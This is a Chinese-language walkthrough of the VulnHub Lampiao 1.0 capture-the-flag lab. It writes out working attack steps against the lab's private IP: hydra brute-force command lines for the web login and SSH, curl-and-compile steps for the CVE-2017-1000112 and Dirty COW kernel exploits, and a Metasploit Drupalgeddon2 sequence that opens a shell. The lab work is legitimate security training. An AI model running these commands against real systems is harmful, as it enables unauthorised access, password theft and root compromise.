# Lampiao 1.0

## Infomation

**Lampiao 1.0** is a vulnerable machine created by [VulnHub](https://www.vulnhub.com/entry/lampiao-1,249/). 

Lampião 1.0 是一个难度为初级的Boot2root/CTF挑战

描述：Virgulino Ferreira da Silva，绰号Lampião（油灯），是巴西东北地区最有名的土匪首领。

- [合天网安 VulnHub渗透测试实战靶场Lampiao 1.0](https://www.hetianlab.com/expc.do?ec=ECID2be0-d959-4d2b-8909-2db854f3c0a2)

## 思路

### 0x01 扫描

- `nmap -sP 192.168.128.1/24` 找到主机
- `nmap -A 192.168.128.135` 找到开放端口和服务

扫描出来 Drupal 是一个突破口，后面看看能不能利用

### 0x02 分析

打开扫描出来的网站看看有没有发现

- http://192.168.128.135 # 没啥发现
- http://192.168.128.135:1898 # 是一个类似博客的站点，有登录功能，有文章发布功能，从文章信息中可以看到发布文章的用户名

找到用户名就可以尝试一下密码爆破了，首先制作密码字典，然后使用 `hydra` 进行爆破

其中制作密码字典的工具有很多，这里使用 `cewl` 来制作密码字典 `cewl -w target.txt http://192.168.128.135:1898/?q=node/1`

??? tip "字典制作工具"

    - [CeWL](https://www.kali.org/tools/cewl/): 是个 Kali 中的工具，爬取网站并提取独立单词的列表。他它也可以提供每次单词的重复次数，保存结果到文件，使用页面的元数据。
    - [crunch](https://www.kali.org/tools/crunch/): 是个 Kali 中的工具，这是基于由用户提供的字符集合的生成器，它使用这个集合来生成所有可能的组合。。
    - [Wordlist Maker(WLM)](http://www.pentestplus.co.uk/wlm.htm): WLM 能够基于字符集来生成单词列表，也能够从文本文件和网页中提取单词。
    - [Common User Password Profiler (CUPP)](https://github.com/Mebus/cupp): 这个工具可以使用单词列表来为常见的用户名分析可能的密码，以及从数据库下载单词列表和默认密码



然后使用 `hydra` 进行爆破 `hydra -L username.txt -P target.txt -vV -f 192.168.128.135 -s 1898 http-post-form "/?q=node/1&destination=node/1:name=^USER^&pass=^PASS^&form_build_id=form-WKAqjKEpImQ1oLNhJtypMBxwHeQY409y_3QCEB5trJY&form_id=user_login_block&op=Log+in:Sorry, unrecognized username or password."`

*注意到有一种服务类型为：http[s]-{get|post}-form，选择此服务类型，Hydra会发送Web的form表单模拟登录，可选POST或GET方式。*

??? tip "hydra 参数说明"
    
    - `-R`        恢复前一次失败的或缓存的攻击
    - `-S`        使用SSL连接
    - `-s PORT`   若是服务没有使用默认端口，则用这一参数指定端口
    - `-l LOGIN or -L FILE`  把LOGIN作为登录名，或是从文件FILE中载入一系列登录名
    - `-p PASS  or -P FILE`  将PASS作为密码, 或是从文件FILE中载入一系列密码
    - `-x MIN:MAX:CHARSET`  生成暴力破解用的密码, 输入 "-x -h" 获得更多帮助
    - `-e nsr`    尝试： n 空密码，s 将登录名作为密码，r 反转登录
    - `-u`        循环用户名, 不使用密码 (有效的! 用 -x 说明)
    - `-C FILE`   取代 -L/-P 选项，输入格式是以冒号分割："login:pass"
    - `-M FILE`   要攻击的服务器列表, 一行一个, 用':'指定端口
    - `-o FILE`   将找到的用户名/密码对写入到文件FILE中，而不输出到标准输出
    - `-f / -F`   当找到一对用户名/密码后退出 (-M: -f 每个主机, -F 全局)
    - `-t TASKS`  同时运行TASKS个线程 (每个主机默认为16)
    - `-w / -W TIME`  每个请求的等待时间 (32) / 线程之间发起连接的时间间隔 (0)
    - `-4 / -6`   使用IPv4 (默认) / IPv6 地址 (put always in [] also in -M)
    - `-v / -V / -d`  冗余模式 / 展示每次攻击时使用的用户名和密码 / 调试模式
    - `-O`        使用旧版的SSL v2 和 v3
    - `-q`        不输出有关连接错误的信息
    - `-U`        服务模块用法细节
    - `server`    目标服务器: DNS, IP or 192.168.0.0/24 (使用此选项或 -M 选项)
    - `service`   要破解的服务 (支持的协议在上面已经给出了)
    - `OPT`       一些服务模块支持额外的输入 (参数 -U 可查看模块帮助)

web 密码破解出来后登录时发现登录次数超限了，白忙活了

换个思路试试破解 ssh 密码，同样是用 hydra 进行爆破，`hydra -L username.txt -P target.txt -f -e nsr -t 8 ssh://192.168.128.135`

ssh 密码破解成功后，登录 shh，接下来就是提取了

### 0x03 提权

尝试利用SUID提权，比如nmap，vim，less等，发现均没有成功。

#### 第一种

[Linux内核逃逸 (CVE-2017-1000112) 提权](#linux-cve-2017-1000112)，由于内核版本 < 4.12.3，所以可以利用此漏洞提权。

但在提权过程中需要编译c文件，但是在此机器上没有编译器，所以需要先上传编译器，这里使用的是 gcc，上传后编译 c 文件，然后执行即可提权成功。

#### 第二种

[Dirty COW (CVE-2016-5195) 提权](#dirty-cow-cve-2016-5195)，由于内核版本 >= 2.6.22，所以可以利用此漏洞提权。

具体操作步骤参照下文总结部分。

#### 第三种

[Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600) 提权](#drupal-drupalgeddon-2-cve-2018-7600)，由于在最开始扫描结果中发现了 Drupal，所以可以利用此漏洞提权。

具体操作步骤参照下文总结部分。



## 总结

### Linux内核逃逸 (CVE-2017-1000112) 提权

???+ tip "Linux内核逃逸 (CVE-2017-1000112)"

    Linux内核中的UDP碎片卸载(UFO)代码中的内存损坏问题可能导致本地特权的升级。

    影响范围：Linux Kernel < 4.12.3

[PoC](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c){ .md-button }

#### Installation:

Compile the PoC:

- `curl -o poc.c https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c`
- `gcc poc.c -o poc`

Run the PoC:

- `./poc` # done, should be root now


### Dirty COW (CVE-2016-5195) 提权

???+ tip "Dirty COW"

    脏牛漏洞当年可以秒杀大部分Linux系统，但是现在已经修复了，所以这里就不再赘述了。
    
    影响范围：Linux Kernel >= 2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。

[PoC](https://github.com/gbonacini/CVE-2016-5195){ .md-button }   [Exploit](https://www.exploit-db.com/exploits/40847){ .md-button }

#### Installation:

Compile the program: 

- `curl -o dcow.cpp https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp`

- `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil`

Start the program:

- `./dcow`

or

- `./dcow -s` # Automatically open a root shell and restore the passwd file.

- `./dcow -s -n` # Automatically open a root shell but doesn't restore the passwd file.

Online help:

- `./dcow -h`

### Drupal Drupalgeddon 2 远程代码执行漏洞 (CVE-2018-7600) 提权

Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。

2018年3月28日，Drupal Security Team官方发布公告称Drupal 6,7,8等多个子版本存在远程代码执行漏洞，攻击者可以利用该漏洞执行恶意代码。

Drupal未对表单请求数据做严格过滤，导致攻击者可以将恶意代码注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。

受影响的版本范围：Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1

[MSF](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/){ .md-button }

#### Exploit

```shell
MSF: use unix/webapp/drupal_drupalgeddon2
MSF: set rhosts 192.168.128.135
MSF: set rport 1898
MSF: exploit
meterpreter > shell
```


## 参考

- [CVE-2017-1000112漏洞分析](https://www.anquanke.com/post/id/92755#h2-18)
- [CVE-2017-1000112 PoC](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c)
- [CVE-2016-5195漏洞分析](https://www.anquanke.com/post/id/84772/)
- [CVE-2016-5195 PoC](https://github.com/gbonacini/CVE-2016-5195/blob/master/dcow.cpp)
- [CVE-2018-7600漏洞分析](https://www.cnblogs.com/4thrun/p/15148584.html)
- [Linux提权-利用SUID提权](https://blog.csdn.net/fly_hps/article/details/80428173)
- [合天网安-脏牛提取实验](http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2016103117181500001)